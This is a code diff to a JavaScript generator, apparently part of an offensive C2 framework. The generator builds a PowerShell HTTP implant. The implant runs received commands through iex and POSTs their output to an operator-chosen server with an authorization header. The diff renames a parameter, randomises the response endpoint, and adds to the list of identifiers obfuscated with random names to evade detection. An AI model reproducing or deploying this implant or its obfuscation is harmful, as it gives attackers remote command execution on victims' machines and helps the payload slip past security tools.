@@ -280,11 +280,11 @@ function generate_powershell_http(){
         $command_here  =(iex $command_here 2>&1 | Out-String )
         return $command_here
     }
-    function post_response([string]$command){
+    function post_response([string]$command_here){
     
 
-        $postParams = @{rfile=$command}
-        $req = Invoke-WebRequest "http://localhost:8080/response/mskd" -Headers @{"Authorization"="id_value_change_here"} -Method POST -Body $postParams 
+        $postParams = @{rfile=$command_here}
+        $req = Invoke-WebRequest "http://localhost:8080/response/post1234" -Headers @{"Authorization"="id_value_change_here"} -Method POST -Body $postParams 
     }
     $varrrrr = 1
     
@@ -306,7 +306,6 @@ function generate_powershell_http(){
     `
     let IP = document.getElementById("powershell_ip").value
     let time_sleep = document.getElementById("time_sleep").value
-    let powershell_domain = document.getElementById("powershell_domain").value
 
     // check if there is slash in the end
     if(IP.substr(IP.length - 1) != "/"){
@@ -314,7 +313,6 @@ function generate_powershell_http(){
     }
     base = base.replaceAll("http://localhost:8080/",IP)
     base = base.replaceAll("time_sleep",time_sleep)
-    base = base.replaceAll("domain_here",powershell_domain)
 
     base =base.replaceAll("get_command",makeid(6))
     base =base.replaceAll("post_response",makeid(6))
@@ -326,6 +324,8 @@ function generate_powershell_http(){
     base =base.replaceAll("file1234",makeid(6))
     base =base.replaceAll("cookie1234",makeid(6))
     base =base.replaceAll("get1234",makeid(6))
+    base =base.replaceAll("post1234",makeid(6))
+
     base =base.replaceAll("postParams",makeid(6))
     base =base.replaceAll("rfile",makeid(6))
     base =base.replaceAll("command_here",makeid(6))
